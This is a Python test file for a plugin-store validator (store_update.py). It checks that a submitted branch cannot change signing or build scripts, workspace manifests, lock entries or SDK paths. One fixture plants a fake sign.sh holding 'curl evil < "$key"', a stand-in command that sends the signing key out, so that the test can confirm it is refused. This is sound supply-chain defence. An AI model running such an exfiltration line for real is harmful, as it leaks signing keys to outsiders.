"""Tests of store_update.py: what store-plugin.yml checks before it builds a plugin.

    python3 -m unittest discover -s tools/plugin-files
"""

import contextlib
import io
import pathlib
import subprocess
import sys
import tempfile
import unittest

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
import store_update  # noqa: E402
import versions  # noqa: E402

WORKSPACE = '[workspace.package]\nversion = "0.6.0-beta.1"\n'


def manifest(version):
    return f'[package]\nname = "paperpaw-plugin-x"\nversion = "{version}"\n'


class Classify(unittest.TestCase):
    def test_the_plugin_its_tooling_and_the_texts_are_its_own(self):
        own, workspace, named, refused = store_update.classify(
            ["plugins/notes-vault/src/lib.rs", "tools/plugin-files/plugins.txt",
             "tools/plugin-files7/src/bin/notes-vault.rs", "tools/plugin-files7/Cargo.toml",
             "tools/plugin-files7/Cargo.lock", "CHANGELOG.md", "docs/data-files.md",
             "changelog.d/226-changelog-fragments.md"],
            "notes-vault")
        self.assertEqual((len(own), workspace, named, refused), (8, [], [], []))

    def test_the_scripts_and_the_workflows_are_never_the_branch_s(self):
        # What runs the checks, the build and the signing is the trusted checkout's.
        scripts = ["tools/plugin-files/store_update.py", "tools/plugin-files/sign.sh",
                   "tools/plugin-files7/build.sh", "tools/plugin-files/check_files.sh",
                   "tools/plugin-files/catalogue.py", "tools/plugin-files7/paperpaw-plugin7.x",
                   "tools/plugin-files7/rust-toolchain.toml", "tools/plugin-files/keyboards/x.ini",
                   ".github/workflows/store-plugin.yml", ".github/actions/xteink-tools/action.yml",
                   "tools/xtensa-std/build.sh", "tools/ci/build-prerequisites.sh"]
        own, workspace, named, refused = store_update.classify(scripts, "notes-vault")
        self.assertEqual((own, workspace, named, refused), ([], [], [], scripts))

    def test_the_workspace_s_lists_are_for_their_own_check_and_the_rest_is_refused(self):
        own, workspace, named, refused = store_update.classify(
            ["Cargo.toml", "Cargo.lock", "plugins/format-epub/src/html.rs",
             "crates/paperpaw-app/src/lib.rs", "plugins/notes-vault-extra/src/lib.rs"],
            "notes-vault")
        self.assertEqual(workspace, ["Cargo.toml", "Cargo.lock"])
        self.assertEqual(len(refused), 3)  # a plugin whose name only begins with the id is another

    def test_a_named_path_or_folder_is_accepted_and_reported(self):
        own, workspace, named, refused = store_update.classify(
            ["plugins/format-epub/src/html.rs", "crates/paperpaw-app/src/lib.rs", "crates/paperpaw-sdk/src/lib.rs"],
            "notes-vault", [" plugins/format-epub/", "crates/paperpaw-app/src/lib.rs", ""])
        self.assertEqual(refused, ["crates/paperpaw-sdk/src/lib.rs"])
        self.assertEqual(len(named), 2)  # entries are stripped of spaces and slashes


TOML = """[workspace]
members = ["crates/paperpaw-sdk", "plugins/old"]

[workspace.dependencies]
paperpaw-sdk = { path = "crates/paperpaw-sdk", version = "1.0.0" }
paperpaw-plugin-old = { path = "plugins/old", version = "1.0.0" }
"""
LOCK = """version = 4

[[package]]
name = "paperpaw-app"
version = "1.0.0"
dependencies = [
 "paperpaw-plugin-old",
]

[[package]]
name = "paperpaw-plugin-old"
version = "1.0.0"

[[package]]
name = "serde"
version = "1.0.0"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "abc"
"""


class Workspace(unittest.TestCase):
    def test_only_a_plugin_s_member_and_entry_pass(self):
        now = (TOML.replace('"plugins/old"]', '"plugins/old", "plugins/new"]')
               + 'paperpaw-plugin-new = { path = "plugins/new", version = "1.0.0" }\n')
        self.assertEqual(store_update.manifest_problems("new", TOML, now), [])

    def test_a_patch_a_profile_or_another_sdk_is_refused(self):
        for extra in ('[patch.crates-io]\nserde = { path = "plugins/new/serde" }\n',
                      '[profile.release]\npanic = "abort"\n',
                      'paperpaw-core = { path = "plugins/new/core", version = "1.0.0" }\n'):
            self.assertTrue(store_update.manifest_problems("new", TOML, TOML + extra), extra)
        moved = TOML.replace('path = "crates/paperpaw-sdk"', 'path = "plugins/new/sdk"')
        self.assertTrue(store_update.manifest_problems("new", TOML, moved))
        outside = TOML.replace('"plugins/old"]', '"plugins/old", "crates/extra"]')
        self.assertIn("only plugins/new", store_update.manifest_problems("new", TOML, outside)[0])

    def test_a_package_and_a_dependency_on_it_pass_in_the_lock(self):
        now = (LOCK.replace('"paperpaw-plugin-old",\n', '"paperpaw-plugin-new",\n "paperpaw-plugin-old",\n')
               + '\n[[package]]\nname = "paperpaw-plugin-new"\nversion = "1.0.0"\n')
        self.assertEqual(store_update.lock_problems("paperpaw-plugin-new", LOCK, now), [])

    def test_a_changed_package_or_dependency_is_refused_in_the_lock(self):
        self.assertTrue(store_update.lock_problems("paperpaw-plugin-new", LOCK, LOCK.replace('"1.0.0"\nsource', '"1.0.1"\nsource')))
        self.assertTrue(store_update.lock_problems("paperpaw-plugin-new", LOCK, LOCK.replace('checksum = "abc"', 'checksum = "xyz"')))
        self.assertTrue(store_update.lock_problems(
            "paperpaw-plugin-new", LOCK, LOCK.replace('"paperpaw-plugin-old",\n', '"paperpaw-plugin-old",\n "serde",\n')))

    def test_a_new_paperpaw_package_or_one_from_outside_is_refused_in_the_lock(self):
        def package(name, source=""):
            return f'\n[[package]]\nname = "{name}"\nversion = "1.0.0"\n' + (f'source = "{source}"\n' if source else "")
        problems = lambda extra: store_update.lock_problems("paperpaw-plugin-new", LOCK, LOCK + extra)
        self.assertEqual(problems(package("paperpaw-plugin-new")), [])
        self.assertTrue(problems(package("paperpaw-sdk-copy")))
        self.assertTrue(problems(package("paperpaw-plugin-other")))
        self.assertTrue(problems(package("left-pad", "registry+https://github.com/rust-lang/crates.io-index")))
        self.assertTrue(problems(package("evil", "git+https://example.org/evil#abc")))
        self.assertEqual(problems(package("helper")), [])

    def test_a_copy_of_the_sdk_in_the_plugin_s_folder_is_refused(self):
        ok = '[dependencies]\npaperpaw-sdk.workspace = true\nother = { path = "../../crates/paperpaw-x" }\n'
        self.assertEqual(store_update.plugin_problems("new", ok), [])
        for spec in ('{ path = "sdk" }', '{ path = "../new/sdk" }', '{ path = "../../tools/x" }'):
            self.assertTrue(store_update.plugin_problems("new", f"[dependencies]\npaperpaw-sdk = {spec}\n"), spec)
        self.assertTrue(store_update.plugin_problems(
            "new", '[target.\'cfg(unix)\'.dependencies]\nx = { path = "src/x" }\n'))


class Check(unittest.TestCase):
    """The check in a repository made here: a base with one plugin, a branch from it."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = pathlib.Path(self.tmp.name)
        self.addCleanup(self.tmp.cleanup)
        self.git("init", "-q", "-b", "main")
        self.write("Cargo.toml", WORKSPACE)
        self.write("plugins/old/Cargo.toml", manifest("1.0.0"))
        self.write("crates/core/lib.rs", "// base\n")
        self.commit("base")
        self.git("tag", "v0.6.0-beta.1")

    def git(self, *args):
        subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@t", *args], cwd=self.root,
                       check=True, capture_output=True)

    def write(self, name, text):
        path = self.root / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")

    def commit(self, message):
        self.git("add", "-A")
        self.git("commit", "-q", "-m", message)

    def check(self, plugin, accepted=(), main=False):
        return store_update.check(self.root, plugin, "v0.6.0-beta.1", accepted, main)

    def test_a_new_plugin_needs_no_older_version(self):
        self.write("plugins/new/Cargo.toml", manifest("1.0.0"))
        self.write("tools/plugin-files/plugins.txt", "new notes\n")
        self.commit("new")
        version, problems, notes = self.check("new")
        self.assertEqual((version, problems), ("1.0.0", []))
        self.assertTrue(any("a new plugin" in note for note in notes), notes)

    def test_an_update_must_raise_its_version(self):
        self.write("plugins/old/src.rs", "// fix\n")
        self.commit("fix")
        _, problems, _ = self.check("old")
        self.assertTrue(any("raise it" in p for p in problems), problems)
        self.write("plugins/old/Cargo.toml", manifest("1.0.1"))
        self.commit("raise")
        self.assertEqual(self.check("old")[:2], ("1.0.1", []))

    def test_a_change_to_the_kernel_is_refused_unless_named(self):
        self.write("plugins/new/Cargo.toml", manifest("1.0.0"))
        self.write("crates/core/lib.rs", "// changed\n")
        self.commit("new and kernel")
        _, problems, _ = self.check("new")
        self.assertTrue(any("crates/core/lib.rs" in p for p in problems), problems)
        version, problems, notes = self.check("new", ["crates/core"])
        self.assertEqual((version, problems), ("1.0.0", []))
        self.assertTrue(any("accepted by name: crates/core" in n and "crates/core/lib.rs" in n for n in notes), notes)

    def test_main_with_other_changes_is_noted_not_refused(self):
        # Main moved on since the base: the kernel and a workspace list changed.
        self.write("plugins/old/Cargo.toml", manifest("1.0.1"))
        self.write("crates/core/lib.rs", "// main moved on\n")
        self.write("Cargo.toml", WORKSPACE + "\n[patch.crates-io]\nx = { path = \"x\" }\n")
        self.commit("main")
        _, problems, _ = self.check("old")
        self.assertTrue(problems, "a branch is held to the base")
        version, problems, notes = self.check("old", main=True)
        self.assertEqual((version, problems), ("1.0.1", []))
        self.assertTrue(any("main differs from v0.6.0-beta.1" in n and "crates/core/lib.rs" in n for n in notes), notes)

    def test_main_still_needs_a_newer_version_and_the_base_as_its_ancestor(self):
        self.write("crates/core/lib.rs", "// main moved on\n")
        self.commit("main without a new version")
        _, problems, _ = self.check("old", main=True)
        self.assertTrue(any("raise it" in p for p in problems), problems)

    def test_a_branch_with_its_own_signing_script_is_refused(self):
        self.write("plugins/new/Cargo.toml", manifest("1.0.0"))
        self.write("tools/plugin-files/sign.sh", "#!/bin/sh\ncurl evil < \"$key\"\n")
        self.commit("new and sign.sh")
        _, problems, _ = self.check("new")
        self.assertTrue(any("tools/plugin-files/sign.sh" in p for p in problems), problems)

    def test_a_moved_sdk_file_is_seen_at_both_ends(self):
        self.write("plugins/new/Cargo.toml", manifest("1.0.0"))
        self.write("crates/core/lib.rs", "// a long enough base file to be a rename candidate\n" * 20)
        self.commit("base grows")
        self.git("tag", "-f", "v0.6.0-beta.1")
        (self.root / "plugins/new/moved.rs").parent.mkdir(parents=True, exist_ok=True)
        (self.root / "crates/core/lib.rs").rename(self.root / "plugins/new/moved.rs")
        self.commit("move")
        _, problems, _ = self.check("new")
        self.assertTrue(any("crates/core/lib.rs" in p for p in problems), problems)

    def test_a_patch_in_the_workspace_manifest_is_refused_unless_named(self):
        self.write("Cargo.toml", WORKSPACE + '[workspace.dependencies]\nserde = "1"\n')
        self.commit("deps")
        self.git("tag", "-f", "v0.6.0-beta.1")
        self.write("plugins/new/Cargo.toml", manifest("1.0.0"))
        self.write("Cargo.toml", WORKSPACE + '[workspace.dependencies]\nserde = "1"\n[patch.crates-io]\nserde = { path = "plugins/new/serde" }\n')
        self.commit("patch")
        _, problems, _ = self.check("new")
        self.assertTrue(any(p.startswith("Cargo.toml:") for p in problems), problems)
        self.assertEqual(self.check("new", ["Cargo.toml"])[1], [])

    def test_a_source_not_made_from_the_base_is_refused(self):
        self.git("checkout", "-q", "--orphan", "other")
        self.write("plugins/new/Cargo.toml", manifest("1.0.0"))
        self.commit("unrelated")
        _, problems, _ = self.check("new")
        self.assertTrue(any("not made from" in p for p in problems), problems)

    def test_a_missing_plugin_or_tag_is_said(self):
        self.assertIn("no such plugin", self.check("nothing")[1][0])
        self.write("plugins/new/Cargo.toml", manifest("1.0.0"))
        self.commit("new")
        _, problems, _ = store_update.check(self.root, "new", "v9.9.9")
        self.assertIn("fetch the base's tag", problems[0])

    def test_the_command_prints_the_version_and_fails_with_a_reason(self):
        self.write("plugins/new/Cargo.toml", manifest("1.2.3"))
        self.commit("new")
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            status = store_update.main(["new", "v0.6.0-beta.1", "--source", str(self.root)])
        self.assertEqual((status, out.getvalue()), (0, "1.2.3\n"))
        self.write("crates/core/lib.rs", "// changed\n")
        self.commit("kernel")
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            status = store_update.main(["new", "v0.6.0-beta.1", "--source", str(self.root)])
        self.assertEqual((status, out.getvalue()), (1, ""))
        self.assertIn("::error::", err.getvalue())


if __name__ == "__main__":
    unittest.main()
